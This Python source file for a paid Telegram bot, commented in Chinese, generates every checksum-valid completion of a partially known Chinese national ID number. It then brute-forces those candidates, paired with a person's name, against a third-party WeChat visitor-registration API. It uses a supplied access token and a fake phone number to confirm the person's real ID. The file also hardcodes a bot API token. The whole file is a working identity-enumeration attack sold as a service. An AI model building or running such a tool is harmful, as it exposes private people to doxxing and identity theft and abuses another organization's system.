import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 核心配置 =================
API_TOKEN = '8417331227:AAESrsOPgEDMeu7NHgLMgoZrynkxoafBLBY'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..." 

bot = telebot.TeleBot(API_TOKEN)
user_states = {}
generated_cache = {} 

# --- 数据持久化逻辑 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): v for k, v in data.items()}
        except: pass
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content: tk = content
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f: json.dump(user_points, f)

def save_token(new_tk):
    with open(TOKEN_FILE, 'w', encoding='utf-8') as f: f.write(new_tk)

def is_valid_id(n):
    if len(n) != 18: return False
    try:
        n = n.upper()
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17]
    except: return False

# --- 像素级进度条渲染 ---
def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar_len = 16 
    filled = int(bar_len * done // total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    return f"⌛ **核验中...**\n`[{bar}] {done}/{total} {percent}%`"

# --- 核心核验任务 ---
def run_batch_task(chat_id, msg_id, name, id_list, uid):
    global CURRENT_X_TOKEN
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(id_list), 0
    success_match, is_running, stop_signal = None, True, False

    def progress_monitor():
        nonlocal done, is_running
        last_time = 0
        while is_running:
            now = time.time()
            if now - last_time > 2.0:
                try:
                    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(done, total), parse_mode='Markdown')
                    last_time = now
                except: pass
            time.sleep(0.5)

    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running, stop_signal, success_match
        if stop_signal or not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            res = r.json()
            if res.get("code") == 0:
                success_match = (f"✨ **核验成功！**\n👤 **姓名:** {name}\n🆔 **号码:** `{id_no}`\n"
                                f"✅ **验证通过**\n💰 **剩余积分:** {user_points[uid]}")
                stop_signal, is_running = True, False
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=15) as executor:
        executor.map(verify, id_list)

    is_running = False
    if success_match:
        bot.send_message(chat_id, success_match, parse_mode='Markdown')
    else:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="❌ 核验完成，未发现匹配结果。")

# ================= 指令逻辑 =================

# 1. 更换 Token 功能 (管理员专用)
@bot.message_handler(commands=['set_token'])
def set_token_cmd(message):
    if message.from_user.id != ADMIN_ID: return
    msg = bot.reply_to(message, "🗝 **请输入新 X-Token:**")
    bot.register_next_step_handler(msg, process_token_update)

def process_token_update(message):
    global CURRENT_X_TOKEN
    new_tk = message.text.strip()
    CURRENT_X_TOKEN = new_tk
    save_token(new_tk)
    bot.send_message(message.chat.id, "✅ **Token 更新成功！** 现已立即生效并保存至本地。")

# 2. 积分充值功能
@bot.message_handler(commands=['add'])
def add_points(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, amt = message.text.split()
        user_points[int(tid)] = user_points.get(int(tid), 0) + int(amt)
        save_points()
        bot.reply_to(message, f"✅ 充值成功！余额: `{user_points[int(tid)]}`")
    except: pass

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    text = (f"👋 **核验模式**\n💰 积分: {pts}\n💸 费用: 100/次\n👤 管理员: {ADMIN_USERNAME}\n\n请输入姓名:")
    bot.send_message(message.chat.id, text, parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'v_name'}

@bot.message_handler(commands=['gen'])
def gen_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    text = (f"🛠 **生成模式**\n💰 积分: {pts}\n💸 费用: 50/次\n👤 管理员: {ADMIN_USERNAME}\n\n请输入补全号(x表示未知):")
    bot.send_message(message.chat.id, text, parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'g_card'}

@bot.callback_query_handler(func=lambda call: call.data == "start_verify_flow")
def callback_start_verify(call):
    if user_points.get(call.from_user.id, 0) < 100:
        bot.answer_callback_query(call.id, "❌ 积分不足", show_alert=True); return
    bot.send_message(call.message.chat.id, "👤 请输入要核验的姓名:")
    user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: m.chat.id in user_states)
def handle_steps(message):
    state, uid, text = user_states[message.chat.id], message.from_user.id, message.text.strip()
    
    if state['step'] == 'g_card':
        user_states[message.chat.id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(message.chat.id, "请输入性别(男/女/未知):")

    elif state['step'] == 'g_sex':
        if user_points.get(uid, 0) < 50: return
        bot.send_message(message.chat.id, "⏳ 正在计算补全...")
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in state['card']]
        if text == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
        elif text == "女": char_sets[16] = ["0", "2", "4", "6", "8"]
        ids = [num for res in itertools.product(*char_sets) if is_valid_id(num := "".join(res))][:5000]
        if ids:
            user_points[uid] -= 50; save_points()
            generated_cache[uid] = {'ids': ids}
            with open("铭.txt", "w") as f: f.write("\n".join(ids))
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🚀 立即核验这些号码 (100积分)", callback_data="start_verify_flow"))
            with open("铭.txt", "rb") as doc:
                bot.send_document(message.chat.id, doc, caption=f"✅ 生成成功！共 `{len(ids)}` 个\n💰 消耗 50 积分，余额 `{user_points[uid]}`", reply_markup=markup)
        del user_states[message.chat.id]

    elif state['step'] == 'v_name_after_gen':
        user_points[uid] -= 100; save_points()
        msg = bot.send_message(message.chat.id, get_ui_bar(0, 100), parse_mode='Markdown')
        threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, text, generated_cache[uid]['ids'], uid)).start()
        del user_states[message.chat.id]

    elif state['step'] == 'v_name':
        user_states[message.chat.id].update({'step': 'v_ids', 'name': text})
        bot.send_message(message.chat.id, "请发送列表:")

    elif state['step'] == 'v_ids':
        v_ids = [i for i in re.findall(r'\d{17}[\dXx]', text) if is_valid_id(i)]
        if v_ids:
            user_points[uid] -= 100; save_points()
            msg = bot.send_message(message.chat.id, get_ui_bar(0, len(v_ids)), parse_mode='Markdown')
            threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, state['name'], v_ids, uid)).start()
        del user_states[message.chat.id]

if __name__ == '__main__':
    bot.infinity_polling()
